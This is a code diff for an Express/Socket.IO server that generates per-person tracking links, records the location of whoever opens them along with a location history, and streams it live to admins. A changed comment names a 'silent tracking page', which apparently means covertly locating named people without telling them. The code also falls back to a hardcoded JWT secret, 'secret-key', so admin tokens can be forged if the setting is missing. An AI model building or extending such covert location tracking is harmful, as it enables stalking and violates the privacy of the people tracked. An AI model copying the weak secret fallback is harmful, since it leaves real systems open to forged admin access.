@@ -73,11 +73,10 @@ const adminSchema = new mongoose.Schema(
 
 const Admin = mongoose.model("Admin", adminSchema);
 
-// Tracking Link Schema
+// Tracking Link Schema (without shortCode)
 const trackingLinkSchema = new mongoose.Schema(
   {
     linkId: { type: String, required: true, unique: true },
-    shortCode: { type: String, required: true, unique: true },
     adminId: {
       type: mongoose.Schema.Types.ObjectId,
       ref: "Admin",
@@ -112,17 +111,6 @@ const TrackingLink = mongoose.model("TrackingLink", trackingLinkSchema);
 
 // Store active tracking sessions
 const adminSessions = new Map();
-
-// Helper function to generate short code
-const generateShortCode = () => {
-  const chars =
-    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-  let code = "";
-  for (let i = 0; i < 6; i++) {
-    code += chars.charAt(Math.floor(Math.random() * chars.length));
-  }
-  return code;
-};
 
 // ================== SOCKET.IO ==================
 io.use((socket, next) => {
@@ -176,7 +164,6 @@ io.on("connection", async (socket) => {
         console.log(`Sending existing location for: ${link.personName}`);
         socket.emit("location-update", {
           linkId: link.linkId,
-          shortCode: link.shortCode,
           location: link.currentLocation,
           personName: link.personName,
           timestamp: link.currentLocation.updatedAt || new Date(),
@@ -239,7 +226,7 @@ io.on("connection", async (socket) => {
               locationHistory: { ...updatedLocation, timestamp: new Date() },
             },
           },
-          { new: true }, // Return the updated document
+          { new: true },
         );
 
         console.log(`✅ Database updated for ${link.personName}`);
@@ -248,7 +235,6 @@ io.on("connection", async (socket) => {
         );
         console.log(`   History count: ${updatedLink.locationHistory.length}`);
 
-        // Acknowledge to the client
         if (callback) callback({ success: true, location: updatedLocation });
 
         // Broadcast to all connected admins
@@ -258,7 +244,6 @@ io.on("connection", async (socket) => {
           console.log(`   Sending to admin: ${adminSession.username}`);
           io.to(adminSession.socketId).emit("location-update", {
             linkId,
-            shortCode: link.shortCode,
             location: updatedLocation,
             personName: link.personName,
             timestamp: new Date(),
@@ -308,7 +293,7 @@ app.post("/api/login", async (req, res) => {
   }
 });
 
-// Generate tracking link
+// Generate tracking link (without short code)
 app.post("/api/admin/generate-link", async (req, res) => {
   try {
     const token = req.headers.authorization?.split(" ")[1];
@@ -324,11 +309,9 @@ app.post("/api/admin/generate-link", async (req, res) => {
     if (!personName) return res.status(400).json({ error: "Name required" });
 
     const linkId = crypto.randomBytes(16).toString("hex");
-    const shortCode = generateShortCode();
 
     const trackingLink = new TrackingLink({
       linkId,
-      shortCode,
       adminId: admin._id,
       personName,
     });
@@ -336,35 +319,15 @@ app.post("/api/admin/generate-link", async (req, res) => {
     await trackingLink.save();
 
     const trackingUrl = `${process.env.FRONTEND_URL || "http://localhost:5173"}/track/${linkId}`;
-    const shortUrl = `${process.env.FRONTEND_URL || "http://localhost:5173"}/l/${shortCode}`;
 
     res.json({
       linkId,
-      shortCode,
       trackingUrl,
-      shortUrl,
       personName,
       expiresAt: trackingLink.expiresAt,
     });
   } catch (error) {
     res.status(500).json({ error: error.message });
-  }
-});
-
-// Redirect short URL (mobile + desktop friendly)
-app.get("/api/short/:shortCode", async (req, res) => {
-  try {
-    const { shortCode } = req.params;
-    const link = await TrackingLink.findOne({ shortCode, isActive: true });
-
-    if (!link || link.expiresAt < new Date()) {
-      return res.status(404).send("Link not found or expired");
-    }
-
-    // Redirect browser to /track/:linkId
-    res.redirect(`/track/${link.linkId}`);
-  } catch (error) {
-    res.status(500).send("Server error");
   }
 });
 
@@ -389,7 +352,7 @@ app.get("/api/admin/tracking-links", async (req, res) => {
   }
 });
 
-// Verify tracking link
+// Verify tracking link (for silent tracking page)
 app.get("/api/track/:linkId", async (req, res) => {
   try {
     const { linkId } = req.params;
@@ -398,7 +361,9 @@ app.get("/api/track/:linkId", async (req, res) => {
     const link = await TrackingLink.findOne({ linkId, isActive: true });
 
     if (!link || link.expiresAt < new Date()) {
-      return res.status(404).json({ error: "Link expired" });
+      return res
+        .status(404)
+        .json({ error: "Link expired or invalid", valid: false });
     }
 
     res.json({ valid: true, personName: link.personName });
@@ -407,61 +372,7 @@ app.get("/api/track/:linkId", async (req, res) => {
   }
 });
 
-// Debug endpoint
-app.get("/api/admin/debug-links", async (req, res) => {
-  try {
-    const token = req.headers.authorization?.split(" ")[1];
-    if (!token) return res.status(401).json({ error: "No token" });
-
-    const decoded = jwt.verify(token, process.env.JWT_SECRET || "secret-key");
-    const admin = await Admin.findById(decoded.userId);
-    if (!admin || admin.role !== "admin") {
-      return res.status(403).json({ error: "Admin only" });
-    }
-
-    const links = await TrackingLink.find({ adminId: admin._id })
-      .sort({ createdAt: -1 })
-      .select(
-        "linkId shortCode personName isActive currentLocation locationHistory",
-      );
-
-    res.json({
-      links: links.map((link) => ({
-        ...link.toObject(),
-        hasLocation: !!link.currentLocation?.lat,
-        locationHistoryCount: link.locationHistory?.length || 0,
-      })),
-    });
-  } catch (error) {
-    res.status(500).json({ error: error.message });
-  }
-});
-
-// Setup admin
-app.post("/api/setup-admin", async (req, res) => {
-  try {
-    const { secretKey, username, email, password } = req.body;
-
-    if (secretKey !== process.env.ADMIN_SECRET_KEY) {
-      return res.status(401).json({ error: "Unauthorized" });
-    }
-
-    const existingAdmin = await Admin.findOne();
-    if (existingAdmin) {
-      return res.status(400).json({ error: "Admin exists" });
-    }
-
-    const hashedPassword = await bcrypt.hash(password, 10);
-    const admin = new Admin({ username, email, password: hashedPassword });
-    await admin.save();
-
-    res.json({ success: true, message: "Admin created!" });
-  } catch (error) {
-    res.status(500).json({ error: error.message });
-  }
-});
-
-// Direct API endpoint for location tracking (alternative to WebSocket)
+// Direct API endpoint for location tracking (main method)
 app.post("/api/track-location/:linkId", async (req, res) => {
   try {
     const { linkId } = req.params;
@@ -507,7 +418,6 @@ app.post("/api/track-location/:linkId", async (req, res) => {
     for (const [adminId, adminSession] of adminSessions) {
       io.to(adminSession.socketId).emit("location-update", {
         linkId,
-        shortCode: updatedLink.shortCode,
         location: updatedLocation,
         personName: updatedLink.personName,
         timestamp: new Date(),
@@ -518,6 +428,58 @@ app.post("/api/track-location/:linkId", async (req, res) => {
   } catch (error) {
     console.error("Error saving location:", error);
     res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// Debug endpoint
+app.get("/api/admin/debug-links", async (req, res) => {
+  try {
+    const token = req.headers.authorization?.split(" ")[1];
+    if (!token) return res.status(401).json({ error: "No token" });
+
+    const decoded = jwt.verify(token, process.env.JWT_SECRET || "secret-key");
+    const admin = await Admin.findById(decoded.userId);
+    if (!admin || admin.role !== "admin") {
+      return res.status(403).json({ error: "Admin only" });
+    }
+
+    const links = await TrackingLink.find({ adminId: admin._id })
+      .sort({ createdAt: -1 })
+      .select("linkId personName isActive currentLocation locationHistory");
+
+    res.json({
+      links: links.map((link) => ({
+        ...link.toObject(),
+        hasLocation: !!link.currentLocation?.lat,
+        locationHistoryCount: link.locationHistory?.length || 0,
+      })),
+    });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+// Setup admin (first time setup)
+app.post("/api/setup-admin", async (req, res) => {
+  try {
+    const { secretKey, username, email, password } = req.body;
+
+    if (secretKey !== process.env.ADMIN_SECRET_KEY) {
+      return res.status(401).json({ error: "Unauthorized" });
+    }
+
+    const existingAdmin = await Admin.findOne();
+    if (existingAdmin) {
+      return res.status(400).json({ error: "Admin already exists" });
+    }
+
+    const hashedPassword = await bcrypt.hash(password, 10);
+    const admin = new Admin({ username, email, password: hashedPassword });
+    await admin.save();
+
+    res.json({ success: true, message: "Admin created successfully!" });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
   }
 });
 
